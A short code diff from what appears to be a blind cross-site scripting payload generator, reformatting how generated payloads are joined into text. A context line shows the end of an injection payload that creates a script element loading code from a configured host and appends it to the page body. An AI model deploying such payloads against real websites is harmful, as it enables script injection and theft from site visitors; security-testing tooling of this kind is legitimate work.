@@ -124,7 +124,7 @@ exports.generatePayloads = config => {
       }/m\\';document.getElementsByTagName(\\'body\\')[0].appendChild(_)')">`
     }
   ];
-  return payloads.map(
-    payload => `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`
-  ).join('');
+  return payloads
+    .map(payload => `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`)
+    .join('');
 };
